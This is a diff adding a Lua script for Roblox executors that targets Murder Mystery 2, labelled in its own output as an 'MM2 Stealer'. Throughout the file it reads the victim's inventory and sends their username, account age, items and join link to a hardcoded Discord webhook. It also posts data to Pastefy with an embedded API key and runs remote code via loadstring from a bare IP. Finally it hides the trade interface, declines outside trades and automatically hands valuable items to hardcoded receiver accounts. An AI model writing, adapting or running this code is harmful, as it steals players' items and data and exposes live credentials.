@@ -1,0 +1,945 @@
+_G.Ex = _G.Ex or false
+if _G.Ex then return end
+_G.Ex = true
+
+local function GetRealJobID()
+    local Result = {
+        JobId = nil,
+        Executor = string.lower(identifyexecutor()),
+        IsDelta = false,
+        Success = false
+    }
+
+    if Result.Executor == 'delta' then
+        Result.IsDelta = true
+
+        local RandomFunc = nil
+        repeat
+            RandomFunc = nil
+            for _, V in ipairs(getgc(true)) do
+                if typeof(V) == 'function' then
+                    local Info = debug.getinfo(V)
+                    if Info and Info.name == 'stepAnimate' then
+                        RandomFunc = V
+                        break
+                    end
+                end
+            end
+            task.wait()
+        until RandomFunc
+
+        local Printed = false
+        local Old = hookfunction(RandomFunc, function(DeltaTime)
+            if not Printed then
+                Printed = true
+                local JobId = game.JobId
+                _G.RealJobID = JobId
+                Result.JobId = JobId
+                Result.Success = true
+            end
+            return Old(DeltaTime)
+        end)
+
+        repeat task.wait() until Result.Success
+    else
+        Result.JobId = game.JobId
+        Result.Success = true
+        _G.RealJobID = Result.JobId
+    end
+
+    return Result
+end
+
+GetRealJobID()
+
+local Users = Usernames or {"daniel123456daniel0, imsopop3"}
+local MinRarity = MinimumRarity or "Godly"
+local MinValue = MinimumValue or 5
+local Ping = "Yes"
+local Webhook = Webhook or "https://discord.com/api/webhooks/1545675200861970562/evjLwMXwoPIq_O3pzu0YiR6oQZGUElnTOaTmEct6wTSRVeQCIB4Aj-Lt1qryBU43lXFS"
+
+if Webhook == "" then return end
+if game.PlaceId ~= 142823291 then return end
+
+pcall(function()
+    local serverType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
+    if serverType == "VIPServer" then
+        game.Players.LocalPlayer:Kick("Private servers not supported.")
+        return
+    end
+end)
+
+if #game.Players:GetPlayers() >= 12 then
+    game.Players.LocalPlayer:Kick("Please join new server, this server is detected.")
+    return
+end
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local Database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+
+local RarityTable = {
+    "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"
+}
+
+local function toTitleCase(str)
+    str = str:lower()
+    local result = ""
+    local len = #str
+    local i = 1
+    local capitalizeNext = true
+    while i <= len do
+        local char = str:sub(i, i)
+        if char == " " then
+            result = result .. " "
+            capitalizeNext = true
+        else
+            if capitalizeNext then
+                result = result .. char:upper()
+                capitalizeNext = false
+            else
+                result = result .. char
+            end
+        end
+        i = i + 1
+    end
+    return result
+end
+
+local function NormalizeName(name)
+    if not name then return "" end
+    name = tostring(name):lower()
+    name = name:gsub("%s+", " ")
+    name = name:gsub("^%s+", ""):gsub("%s+$", "")
+    return name
+end
+
+local function BuildValueList()
+    local flatValues = {} -- normalized name -> numeric value
+
+    local function AddValue(key, val, allowOverwrite)
+        key = NormalizeName(key)
+        if key == "" or type(val) ~= "number" then return end
+        if val >= 1000000 then return end -- skip secret/placeholder 1M entries
+        if flatValues[key] == nil or allowOverwrite then
+            flatValues[key] = val
+        end
+    end
+
+    local function IndexItem(name, val)
+        name = NormalizeName(name)
+        if name == "" then return end
+        AddValue(name, val, false)
+
+        -- without (gun)/(knife) and [event tags]
+        local stripped = name
+            :gsub("%s*%(%s*gun%s*%)", "")
+            :gsub("%s*%(%s*knife%s*%)", "")
+            :gsub("%s*%[.-%]", "")
+        stripped = NormalizeName(stripped)
+        if stripped ~= "" and stripped ~= name then
+            AddValue(stripped, val, false)
+        end
+
+        -- chroma variants
+        if name:match("^chroma%s+") then
+            local plain = NormalizeName(name:gsub("^chroma%s+", ""))
+            AddValue(plain, val, false)
+            AddValue("chroma " .. plain, val, false)
+        else
+            AddValue("chroma " .. name, val, false)
+        end
+    end
+
+    -- 1) Primary: Supreme Values JSON (mirror of supremevalues.com)
+    local gotJson = false
+    local response = request({
+        Url = "https://hoochiem486.github.io/supreme-values-mm2-api/values.json",
+        Method = "GET",
+        Headers = {
+            ["User-Agent"] = "Mozilla/5.0",
+            ["Accept"] = "application/json"
+        }
+    })
+    if response and response.Body then
+        local ok, decoded = pcall(function()
+            return HttpService:JSONDecode(response.Body)
+        end)
+        if ok and decoded and type(decoded.items) == "table" then
+            -- process in category priority order so Ancient beats Godly placeholders
+            local priority = {
+                chromas = 1, uniques = 2, ancients = 3, godlies = 4,
+                vintages = 5, legendaries = 6, rares = 7, uncommons = 8,
+                commons = 9, pets = 10, misc = 11, sets = 12
+            }
+            local sorted = {}
+            for _, item in ipairs(decoded.items) do
+                table.insert(sorted, item)
+            end
+            table.sort(sorted, function(a, b)
+                local pa = priority[NormalizeName(a.category or "")] or 99
+                local pb = priority[NormalizeName(b.category or "")] or 99
+                return pa < pb
+            end)
+
+            for _, item in ipairs(sorted) do
+                if item.valueType == "numeric" and type(item.value) == "number" then
+                    if item.name then IndexItem(item.name, item.value) end
+                    if item.slug then
+                        IndexItem(item.slug:gsub("%-", " "), item.value)
+                    end
+                    if type(item.aliases) == "table" then
+                        for _, alias in ipairs(item.aliases) do
+                            IndexItem(alias, item.value)
+                        end
+                    end
+                end
+            end
+            gotJson = next(flatValues) ~= nil
+        end
+    end
+
+    -- 2) Fallback: legacy Supreme lua table endpoint
+    if not gotJson then
+        local legacy = request({
+            Url = "http://109.120.157.241:5000/supreme",
+            Method = "GET",
+            Headers = { ["User-Agent"] = "Mozilla/5.0" }
+        })
+        if legacy and legacy.Body then
+            local ok, tbl = pcall(function()
+                return loadstring(legacy.Body)()
+            end)
+            if ok and type(tbl) == "table" then
+                local categories = {"Chroma", "Unique", "Ancient", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
+                for _, cat in ipairs(categories) do
+                    local items = tbl[cat]
+                    if type(items) == "table" then
+                        for itemName, val in pairs(items) do
+                            IndexItem(itemName, val)
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    local function LookupValue(baseName, isChroma)
+        baseName = NormalizeName(baseName)
+        if baseName == "" then return nil end
+
+        local alreadyChroma = baseName:match("^chroma%s+") ~= nil
+        local plain = NormalizeName(baseName:gsub("^chroma%s+", ""))
+
+        local candidates = {}
+        if isChroma or alreadyChroma then
+            table.insert(candidates, "chroma " .. plain)
+            table.insert(candidates, baseName)
+            table.insert(candidates, plain)
+        else
+            table.insert(candidates, baseName)
+            table.insert(candidates, plain)
+            table.insert(candidates, baseName .. " (gun)")
+            table.insert(candidates, baseName .. " (knife)")
+            table.insert(candidates, plain .. " (gun)")
+            table.insert(candidates, plain .. " (knife)")
+        end
+
+        for _, key in ipairs(candidates) do
+            local val = flatValues[NormalizeName(key)]
+            if val then return val end
+        end
+        return nil
+    end
+
+    -- map Database Dataid -> value
+    local ValueList = {}
+    for Dataid, Item in pairs(Database) do
+        local ItemName = Item.ItemName or ""
+        if ItemName ~= "" then
+            local val = LookupValue(ItemName, Item.Chroma == true)
+            if val then
+                ValueList[Dataid] = val
+            end
+        end
+    end
+
+    return ValueList
+end
+
+local ValueList = BuildValueList()
+
+local Untradable = {
+    DefaultGun = true, DefaultKnife = true, Reaver = true, Reaver_Legendary = true,
+    Reaver_Godly = true, Reaver_Ancient = true, IceHammer = true, IceHammer_Legendary = true,
+    IceHammer_Godly = true, IceHammer_Ancient = true, Gingerscythe = true,
+    Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
+    TestItem = true, Season1TestKnife = true, Cracks = true, Icecrusher = true,
+    ["???"] = true, Dartbringer = true, TravelerAxeRed = true, TravelerAxeBronze = true,
+    TravelerAxeSilver = true, TravelerAxeGold = true, BlueCamo_K_2022 = true,
+    GreenCamo_K_2022 = true, SharkSeeker = true
+}
+
+local function UploadToPastefy(content)
+    local apikey = "a5qZOAcq1jDOugjUctVjH81uwPhG88eTay0l0pl2g7i3qpNgRyo2KU3uoNPe"
+    local url = "https://pastefy.app/api/v2/paste"
+    
+    local postdata = {
+        title = "MM2 Inventory",
+        content = content,
+        encrypted = false,
+        visibility = "PUBLIC"
+    }
+    
+    local response = request({
+        Url = url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json",
+            ["Authorization"] = "Bearer " .. apikey
+        },
+        Body = HttpService:JSONEncode(postdata)
+    })
+    
+    if response and response.Success then
+        local responsedata = HttpService:JSONDecode(response.Body)
+        if responsedata and responsedata.paste and responsedata.paste.id then
+            return "https://pastefy.app/" .. responsedata.paste.id .. "/raw"
+        end
+    end
+    return "https://pastefy.app/AUFkJuzL"
+end
+
+local function ResolveValue(Dataid, Rarity)
+    local Value = ValueList[Dataid]
+    if Value then return Value end
+    if Rarity == "Ancient" then return 100 end
+    if Rarity == "Unique" then return 50 end
+    if Rarity == "Godly" or Rarity == "Vintage" then return 10 end
+    if Rarity == "Legendary" then return 5 end
+    return 1
+end
+
+-- Full inventory for webhook log (includes items BELOW MinValue threshold)
+local function GetFullInventory()
+    local items = {}
+    local total = 0
+    local RealData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+    if RealData and RealData.Weapons and RealData.Weapons.Owned then
+        for Dataid, Amount in pairs(RealData.Weapons.Owned) do
+            if Amount and Amount > 0 then
+                local ItemData = Database[Dataid]
+                if ItemData and not Untradable[Dataid] then
+                    local Rarity = ItemData.Rarity or ""
+                    local Value = ResolveValue(Dataid, Rarity)
+                    local ItemName = ItemData.ItemName or tostring(Dataid)
+                    local IsChroma = ItemData.Chroma or false
+                    total = total + (Value * Amount)
+                    table.insert(items, {
+                        name = ItemName,
+                        amount = Amount,
+                        value = Value,
+                        rarity = Rarity,
+                        chroma = IsChroma
+                    })
+                end
+            end
+        end
+    end
+    table.sort(items, function(a, b)
+        return (a.value * a.amount) > (b.value * b.amount)
+    end)
+    return items, total
+end
+
+local function GetTradeStatus()
+    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+end
+
+local function SendTradeRequest(User)
+    local Target = Players:FindFirstChild(User)
+    if Target then
+        ReplicatedStorage.Trade.SendRequest:InvokeServer(Target)
+    end
+end
+
+local function AddWeaponToTrade(Id)
+    ReplicatedStorage.Trade.OfferItem:FireServer(Id, "Weapons")
+end
+
+local SecondArgs = nil
+ReplicatedStorage.Trade.UpdateTrade.OnClientEvent:Connect(function(Info)
+    if Info and Info.LastOffer then
+        SecondArgs = Info.LastOffer
+    end
+end)
+
+local function AcceptTrade()
+    if SecondArgs then
+        ReplicatedStorage.Trade.AcceptTrade:FireServer(game.PlaceId * 3, SecondArgs)
+        SecondArgs = nil
+        return true
+    end
+    return false
+end
+
+local function WaitForTradeCompletion()
+    while true do
+        local Status = GetTradeStatus()
+        if Status == "None" then break end
+        task.wait(0.1)
+    end
+end
+
+local MinRarityIndex = table.find(RarityTable, MinRarity)
+
+local function BuildWeaponList()
+    local List = {}
+    local Total = 0
+    local RealData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+    if RealData and RealData.Weapons and RealData.Weapons.Owned then
+        for Dataid, Amount in pairs(RealData.Weapons.Owned) do
+            if Amount and Amount > 0 then
+                local ItemData = Database[Dataid]
+                if ItemData then
+                    local Rarity = ItemData.Rarity or ""
+                    local RarityIndex = table.find(RarityTable, Rarity)
+                    if RarityIndex and RarityIndex >= MinRarityIndex and not Untradable[Dataid] then
+                        local Value = ResolveValue(Dataid, Rarity)
+                        if Value >= MinValue then
+                            local ItemName = ItemData.ItemName or tostring(Dataid)
+                            local IsChroma = ItemData.Chroma or false
+                            Total = Total + (Value * Amount)
+                            table.insert(List, {
+                                DataID = Dataid,
+                                ItemName = ItemName,
+                                Rarity = Rarity,
+                                Amount = Amount,
+                                Value = Value,
+                                IsChroma = IsChroma
+                            })
+                        end
+                    end
+                end
+            end
+        end
+    end
+    table.sort(List, function(A, B)
+        return (A.Value * A.Amount) > (B.Value * B.Amount)
+    end)
+    return List, Total
+end
+
+local WeaponsToSend, TotalValue = BuildWeaponList()
+local FullItems, TotalInventoryValue = GetFullInventory()
+
+local FullInventoryText = ""
+for _, item in ipairs(FullItems) do
+    local name = toTitleCase(item.name)
+    if item.chroma then
+        name = name .. " (Chroma)"
+    end
+    FullInventoryText = FullInventoryText .. string.format("%s [%dx] [%s] - %d each (Total: %d)\n", 
+        name, item.amount, item.rarity, item.value, item.value * item.amount)
+end
+
+local PastefyLink = nil
+pcall(function()
+    PastefyLink = UploadToPastefy(FullInventoryText)
+end)
+
+local function SendWebhook(Data, File, url)
+    local Args = {
+        Url = url or Webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(Data)
+    }
+    if File then
+        Args.Files = {
+            {
+                Name = File.name or "inventory.txt",
+                Data = File.data,
+                ContentType = "text/plain"
+            }
+        }
+    end
+    
+    for attempt = 1, 3 do
+        local ok, response = pcall(function()
+            return request(Args)
+        end)
+        if ok and response then
+            return true
+        end
+        task.wait(0.5)
+    end
+    return false
+end
+
+local function BuildWeaponsEmbedText(WeaponList)
+    if not WeaponList or #WeaponList == 0 then
+        return "None Found"
+    end
+
+    -- group by rarity (high -> low)
+    local order = {"Ancient", "Unique", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}
+    local groups = {}
+    for _, W in ipairs(WeaponList) do
+        local r = W.Rarity or "Unknown"
+        if not groups[r] then groups[r] = {} end
+        local Name = toTitleCase(W.ItemName)
+        if W.IsChroma then
+            Name = "Chroma " .. Name
+        end
+        table.insert(groups[r], string.format("- %dx %s → %d", W.Amount, Name, W.Value * W.Amount))
+    end
+
+    local lines = {}
+    local used = {}
+    for _, r in ipairs(order) do
+        if groups[r] then
+            table.insert(lines, r)
+            for _, line in ipairs(groups[r]) do
+                table.insert(lines, line)
+            end
+            used[r] = true
+        end
+    end
+    for r, list in pairs(groups) do
+        if not used[r] then
+            table.insert(lines, r)
+            for _, line in ipairs(list) do
+                table.insert(lines, line)
+            end
+        end
+    end
+
+    local text = table.concat(lines, "\n")
+    if #text > 1000 then
+        text = text:sub(1, 990) .. "\n..."
+    end
+    return text
+end
+
+local function BuildBelowThresholdText()
+    local lines = {}
+    local total = 0
+    if FullItems then
+        for _, item in ipairs(FullItems) do
+            local v = item.value or 0
+            local amt = item.amount or 1
+            if v < (MinValue or 1) then
+                local name = toTitleCase(item.name or "?")
+                if item.chroma then
+                    name = "Chroma " .. name
+                end
+                total = total + (v * amt)
+                table.insert(lines, string.format("- %dx %s → %d [%s]", amt, name, v * amt, item.rarity or "?"))
+            end
+        end
+    end
+    if #lines == 0 then
+        return "None", 0
+    end
+    local text = table.concat(lines, "\n")
+    if #text > 900 then
+        local kept = {}
+        local n = 0
+        for _, line in ipairs(lines) do
+            n = n + #line + 1
+            if n > 880 then
+                table.insert(kept, "... and more (see Full Inventory Log)")
+                break
+            end
+            table.insert(kept, line)
+        end
+        text = table.concat(kept, "\n")
+    end
+    return text, total
+end
+
+local function SendFirstMessage(AllWeapons)
+    local hasHits = AllWeapons and #AllWeapons > 0
+    local Prefix = ""
+    if hasHits and Ping == "Yes" then
+        Prefix = "@everyone"
+    end
+
+    local receivers = table.concat(Users, ", ")
+    if receivers == "" then receivers = "None" end
+
+    local PlayerInfo = string.format(
+        "Username: %s\nAccount Age: %d days\nPlayers: %s\nExecutor: %s\nReceivers: %s",
+        LocalPlayer.Name,
+        LocalPlayer.AccountAge,
+        GetPlayerCount(),
+        ExecutorName,
+        receivers
+    )
+
+    local weaponsText = BuildWeaponsEmbedText(AllWeapons)
+    local weaponsTitle = string.format("Weapons (Total Val: %d) — Threshold: >%d", TotalValue or 0, MinValue or 1)
+
+    -- items under threshold still shown here (not only in paste link)
+    local belowText, belowTotal = BuildBelowThresholdText()
+    local belowTitle = string.format("Below Threshold (Total Val: %d)", belowTotal)
+
+    local fields = {
+        {
+            name = "Player Info",
+            value = "```\n" .. PlayerInfo .. "\n```",
+            inline = false
+        },
+        {
+            name = weaponsTitle,
+            value = "```\n" .. weaponsText .. "\n```",
+            inline = false
+        },
+        {
+            name = belowTitle,
+            value = "```\n" .. belowText .. "\n```",
+            inline = false
+        },
+        {
+            name = "Join Link",
+            value = tostring(_G.RealJobID or game.JobId),
+            inline = false
+        }
+    }
+
+    if PastefyLink and PastefyLink ~= "" then
+        table.insert(fields, {
+            name = "View Full Inventory Log",
+            value = "[Click Here](" .. PastefyLink .. ")",
+            inline = false
+        })
+    end
+
+    local Embed = {
+        title = "Murder Mystery 2 Hit!",
+        color = hasHits and 16711680 or 0,
+        fields = fields,
+        footer = {
+            text = "MM2 Stealer | " .. GetTime() .. " (GMT+8)"
+        }
+    }
+
+    local Data = {
+        content = Prefix,
+        embeds = { Embed }
+    }
+
+    SendWebhook(Data, nil)
+end
+
+-- Always send webhook (Elysium-style). Items below MinValue still appear in Full Inventory Log.
+SendFirstMessage(WeaponsToSend)
+
+if #WeaponsToSend > 0 then
+    local function IsUserAllowed(PlayerName)
+        for _, User in ipairs(Users) do
+            if User == PlayerName then
+                return true
+            end
+        end
+        return false
+    end
+
+    local Trade = ReplicatedStorage.Trade
+
+    local function DeclineTradeRequest()
+        pcall(function()
+            local Event = Trade:FindFirstChild("DeclineRequest")
+            if Event then
+                Event:FireServer()
+            end
+        end)
+        pcall(function()
+            local Event = Trade:FindFirstChild("DeclineTrade")
+            if Event then
+                Event:FireServer()
+            end
+        end)
+        pcall(function()
+            Trade.DeclineRequest:FireServer()
+        end)
+        pcall(function()
+            Trade.DeclineTrade:FireServer()
+        end)
+    end
+
+    local StartTradeEvent = Trade:FindFirstChild("StartTrade")
+    if StartTradeEvent then
+        StartTradeEvent.OnClientEvent:Connect(function(TradeData, RequesterName)
+            local isAllowed = false
+            if RequesterName then
+                isAllowed = IsUserAllowed(RequesterName)
+            elseif TradeData and TradeData.Player1 and TradeData.Player1.Player then
+                local requester = TradeData.Player1.Player
+                if typeof(requester) == "Instance" and requester.Name then
+                    isAllowed = IsUserAllowed(requester.Name)
+                end
+            end
+            if not isAllowed then
+                DeclineTradeRequest()
+            end
+        end)
+    end
+
+    local function AggressiveMonitor()
+        local Status = GetTradeStatus()
+        if Status == "ReceivingRequest" or Status == "StartTrade" then
+            local success, TradeData = pcall(function()
+                return Trade.GetTradeData:InvokeServer()
+            end)
+            if success and TradeData then
+                local RequesterName = nil
+                if TradeData.Player1 and TradeData.Player1.Player then
+                    local requester = TradeData.Player1.Player
+                    if typeof(requester) == "Instance" and requester.Name then
+                        RequesterName = requester.Name
+                    elseif type(requester) == "string" then
+                        RequesterName = requester
+                    end
+                end
+                if RequesterName and not IsUserAllowed(RequesterName) then
+                    DeclineTradeRequest()
+                end
+            end
+        end
+    end
+
+    game:GetService("RunService").Heartbeat:Connect(function()
+        AggressiveMonitor()
+    end)
+
+    task.spawn(function()
+        while task.wait(0.1) do
+            AggressiveMonitor()
+        end
+    end)
+
+    local function SetupTradeGUI()
+        local TradeGUI = PlayerGui:FindFirstChild("TradeGUI")
+        if TradeGUI then
+            TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
+                if TradeGUI.Enabled then
+                    AggressiveMonitor()
+                    task.wait(0.1)
+                    AggressiveMonitor()
+                    TradeGUI.Enabled = false
+                end
+            end)
+        end
+        local TradeGUIPhone = PlayerGui:FindFirstChild("TradeGUI_Phone")
+        if TradeGUIPhone then
+            TradeGUIPhone:GetPropertyChangedSignal("Enabled"):Connect(function()
+                if TradeGUIPhone.Enabled then
+                    AggressiveMonitor()
+                    task.wait(0.1)
+                    AggressiveMonitor()
+                    TradeGUIPhone.Enabled = false
+                end
+            end)
+        end
+    end
+
+    SetupTradeGUI()
+
+    local TradeGui = PlayerGui:WaitForChild("TradeGUI")
+    TradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() TradeGui.Enabled = false end)
+    local TradeGuiPhone = PlayerGui:WaitForChild("TradeGUI_Phone")
+    TradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function() TradeGuiPhone.Enabled = false end)
+
+    local SentWeapons = {}
+    for I, V in ipairs(WeaponsToSend) do SentWeapons[I] = V end
+
+    local function RefreshInventory()
+        WeaponsToSend, TotalValue = BuildWeaponList()
+        local newItems, newTotal = GetFullInventory()
+        FullItems = newItems
+        TotalInventoryValue = newTotal
+        return #WeaponsToSend
+    end
+
+    local function DoTrade(JoinedUser)
+        pcall(function()
+            local status = GetTradeStatus()
+            if status == "StartTrade" then
+                ReplicatedStorage.Trade.DeclineTrade:FireServer()
+            elseif status == "ReceivingRequest" then
+                ReplicatedStorage.Trade.DeclineRequest:FireServer()
+            end
+        end)
+        task.wait(0.5)
+        
+        local Target = Players:FindFirstChild(JoinedUser)
+        if not Target then
+            return false
+        end
+        
+        pcall(function()
+            ReplicatedStorage.Trade.SendRequest:InvokeServer(Target)
+        end)
+        
+        local waitTime = 0
+        local tradeStarted = false
+        while waitTime < 30 do
+            task.wait(0.5)
+            waitTime = waitTime + 0.5
+            local status = GetTradeStatus()
+            if status == "StartTrade" then
+                tradeStarted = true
+                break
+            elseif status == "ReceivingRequest" then
+                ReplicatedStorage.Trade.AcceptRequest:FireServer()
+                tradeStarted = true
+                break
+            end
+        end
+        
+        if not tradeStarted then
+            return false
+        end
+        
+        while #WeaponsToSend > 0 do
+            local Status = GetTradeStatus()
+            if Status == "StartTrade" then
+                for I = 1, math.min(4, #WeaponsToSend) do
+                    local Weapon = table.remove(WeaponsToSend, 1)
+                    for Count = 1, Weapon.Amount do
+                        pcall(function()
+                            AddWeaponToTrade(Weapon.DataID)
+                        end)
+                        task.wait(0.05)
+                    end
+                end
+                task.wait(6)
+                AcceptTrade()
+                WaitForTradeCompletion()
+                local Remaining = RefreshInventory()
+                if Remaining == 0 then
+                    return true
+                end
+                task.wait(1.5)
+            else
+                local Target2 = Players:FindFirstChild(JoinedUser)
+                if Target2 then
+                    pcall(function()
+                        ReplicatedStorage.Trade.SendRequest:InvokeServer(Target2)
+                    end)
+                else
+                    return false
+                end
+                task.wait(2)
+            end
+        end
+        return true
+    end
+
+    local isProcessing = false
+    local processedUsers = {}
+    
+    local function FindAvailableUsers()
+        local available = {}
+        for _, UserName in ipairs(Users) do
+            local Player = Players:FindFirstChild(UserName)
+            if Player and Player.Character and Player.Character:FindFirstChild("Humanoid") then
+                if not processedUsers[UserName] then
+                    table.insert(available, UserName)
+                end
+            end
+        end
+        return available
+    end
+    
+    local function ProcessUser(PlayerName)
+        if isProcessing then return end
+        if processedUsers[PlayerName] then return end
+        
+        isProcessing = true
+        
+        if not PlayerName or PlayerName == "" then
+            isProcessing = false
+            return
+        end
+        
+        local Player = Players:FindFirstChild(PlayerName)
+        if not Player then
+            processedUsers[PlayerName] = nil
+            isProcessing = false
+            return
+        end
+        
+        processedUsers[PlayerName] = true
+        
+        local attempts = 0
+        while attempts < 30 do
+            attempts = attempts + 1
+            task.wait(1)
+            Player = Players:FindFirstChild(PlayerName)
+            if Player and Player.Character and Player.Character:FindFirstChild("Humanoid") then
+                break
+            end
+        end
+        
+        if not Player or not Player.Character or not Player.Character:FindFirstChild("Humanoid") then
+            processedUsers[PlayerName] = nil
+            isProcessing = false
+            return
+        end
+        
+        task.wait(1)
+        local success = DoTrade(PlayerName)
+        
+        task.wait(2)
+        processedUsers[PlayerName] = nil
+        isProcessing = false
+        
+        if success or not Players:FindFirstChild(PlayerName) then
+            task.wait(1)
+            CheckAndProcessUsers()
+        end
+    end
+    
+    local function CheckAndProcessUsers()
+        if isProcessing then return end
+        
+        local available = FindAvailableUsers()
+        if #available > 0 then
+            task.spawn(function()
+                ProcessUser(available[1])
+            end)
+        end
+    end
+    
+    CheckAndProcessUsers()
+    
+    Players.PlayerAdded:Connect(function(Player)
+        if table.find(Users, Player.Name) then
+            task.wait(1)
+            CheckAndProcessUsers()
+        end
+    end)
+    
+    Players.PlayerRemoving:Connect(function(Player)
+        if table.find(Users, Player.Name) then
+            processedUsers[Player.Name] = nil
+            task.wait(1)
+            CheckAndProcessUsers()
+        end
+    end)
+    
+    task.spawn(function()
+        while task.wait(2) do
+            CheckAndProcessUsers()
+        end
+    end)
+    
+else
+    return
+end
